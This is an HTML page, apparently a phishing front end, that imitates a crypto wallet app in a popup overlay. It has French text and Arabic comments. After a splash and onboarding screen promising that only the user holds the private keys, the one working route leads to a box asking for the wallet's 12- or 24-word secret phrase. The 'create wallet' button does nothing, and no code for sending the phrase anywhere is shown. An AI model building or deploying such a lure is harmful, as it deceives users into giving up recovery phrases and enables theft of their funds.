<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Crypto App Flow Popup</title>
    <style>
        /* التنسيق العام للخلفية المنبثقة */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        
        body, html { 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
            background-color: #000000; /* خلفية سوداء لتعزيز شكل الـ Popup */
        }

        /* حاوية النافذة المنبثقة - تظهر في المنتصف كما في الصورة */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85); /* تعتيم الخلفية */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .app-container {
            width: 100%;
            max-width: 400px; /* العرض المثالي للـ Popup كما في الصور */
            height: 85vh; /* ارتفاع متناسق */
            background: #ffffff;
            border-radius: 20px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        /* --- 1. Splash Screen --- */
        #splash-screen {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #4249e7 0%, #308ae4 50%, #17c2f1 100%);
            display: flex; justify-content: center; align-items: center;
            z-index: 1000; transition: 0.6s;
        }
        #splash-screen img { width: 100px; }

        /* --- 2. Onboarding Screen --- */
        #onboarding-screen {
            position: absolute; width: 100%; height: 100%;
            display: flex; flex-direction: column; align-items: center;
            padding: 40px 20px; text-align: center; opacity: 0; visibility: hidden; transition: 0.5s;
        }
        .hero-image { width: 100%; max-width: 220px; margin-top: 20px; }
        .title { font-size: 22px; font-weight: 700; margin-top: 30px; color: #1a1a1a; }
        .description { font-size: 15px; color: #777; margin-top: 10px; padding: 0 10px; }
        
        .dots { display: flex; gap: 8px; margin: 25px 0; }
        .dot { width: 7px; height: 7px; background: #eee; border-radius: 50%; }
        .dot.active { width: 20px; background: #4249e7; border-radius: 4px; }

        .btn-primary { width: 100%; height: 50px; background: linear-gradient(to right, #3f51b5, #5a87b2); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; }
        .btn-secondary { background: none; border: none; color: #5a87b2; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 12px; }

        /* --- 3. Import Methods Screen --- */
        #import-methods-screen {
            position: absolute; width: 100%; height: 100%; background: #f9f9f9;
            transform: translateX(100%); transition: 0.4s; z-index: 50;
        }
        #import-methods-screen.active { transform: translateX(0); }

        /* --- 4. Manual Entry Screen --- */
        #manual-entry-screen {
            position: absolute; width: 100%; height: 100%; background: white;
            transform: translateX(100%); transition: 0.4s; z-index: 60;
            display: flex; flex-direction: column;
        }
        #manual-entry-screen.active { transform: translateX(0); }

        /* الهيدر المتوافق مع الـ Popup */
        .header { display: flex; align-items: center; padding: 15px; background: white; border-bottom: 1px solid #f0f0f0; }
        .back-btn { font-size: 26px; cursor: pointer; padding: 0 10px; color: #333; }
        .header-title { flex-grow: 1; text-align: center; font-size: 17px; font-weight: 600; margin-right: 40px; }
        
        /* المدخلات */
        .inputs-container { padding: 25px 20px; flex-grow: 1; }
        .input-box {
            width: 100%; height: 70px; border: 1.5px solid #e0e6ed;
            border-radius: 12px; margin-bottom: 20px; padding: 12px;
            font-size: 14px; color: #333; resize: none; outline: none; background: #fcfdfe;
        }

        .importer-btn-container { padding: 20px; border-top: 1px solid #f0f0f0; }
        .btn-importer {
            width: 100%; height: 52px;
            background: linear-gradient(to right, #2b56d3, #15bff0);
            color: white; border: none; border-radius: 26px;
            font-size: 17px; font-weight: 600; cursor: pointer;
        }

        /* كارت الخيار */
        .import-card {
            background: white; margin: 15px 20px; padding: 18px;
            border-radius: 16px; display: flex; align-items: center; gap: 15px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.03); cursor: pointer; border: 1px solid #f0f0f0;
        }
    </style>
</head>
<body>

    <div class="popup-overlay">
        <div class="app-container">

            <div id="splash-screen">
                <img src="icon1.png" alt="Splash Logo">
            </div>

            <div id="onboarding-screen">
                <img src="icon2.png" alt="Hero" class="hero-image">
                <h1 class="title">Sûr et pratique</h1>
                <p class="description">Vous seul avez accès aux clés privées</p>
                <div class="dots"><div class="dot active"></div><div class="dot"></div><div class="dot"></div></div>
                <div style="margin-top:auto; width:100%">
                    <button class="btn-primary">Créer un portefeuille</button>
                    <button class="btn-secondary" onclick="openScreen('import-methods-screen')">J'ai déjà un portefeuille</button>
                </div>
            </div>

            <div id="import-methods-screen">
                <div class="header">
                    <span class="back-btn" onclick="closeScreen('import-methods-screen')">‹</span>
                    <div class="header-title">Importer le portefeuille</div>
                </div>
                <p style="text-align:center; padding:20px; color:#999; font-size: 14px;">Sélectionnez une méthode d'importation</p>
                <div class="import-card" onclick="openScreen('manual-entry-screen')">
                    <img src="icon3.png" alt="Icon" style="width:45px;">
                    <div>
                        <h3 style="font-size:16px; color:#1a1a1a;">Manuellement</h3>
                        <p style="font-size:12px; color:#999;">Écrivez manuellement la phrase secrète sauvegardée</p>
                    </div>
                </div>
            </div>

            <div id="manual-entry-screen">
                <div class="header">
                    <span class="back-btn" onclick="closeScreen('manual-entry-screen')">‹</span>
                    <div class="header-title">Importer le portefeuille</div>
                </div>
                
                <div class="inputs-container">
                    <textarea class="input-box" placeholder="Saisissez votre phrase secrète (12 ou 24 mots)"></textarea>
                    <textarea class="input-box" placeholder="Nom du portefeuille (Optionnel)"></textarea>
                </div>

                <div class="importer-btn-container">
                    <button class="btn-importer">Importer</button>
                </div>
            </div>

        </div>
    </div>

    <script>
        // منطق Splash Screen
        window.addEventListener('load', () => {
            setTimeout(() => {
                const splash = document.getElementById('splash-screen');
                splash.style.opacity = '0';
                setTimeout(() => {
                    splash.style.display = 'none';
                    const main = document.getElementById('onboarding-screen');
                    main.style.opacity = '1'; 
                    main.style.visibility = 'visible';
                }, 600);
            }, 2500);
        });

        // وظائف التنقل بين الشاشات
        function openScreen(id) { 
            document.getElementById(id).classList.add('active'); 
        }
        function closeScreen(id) { 
            document.getElementById(id).classList.remove('active'); 
        }
    </script>
</body>
</html>
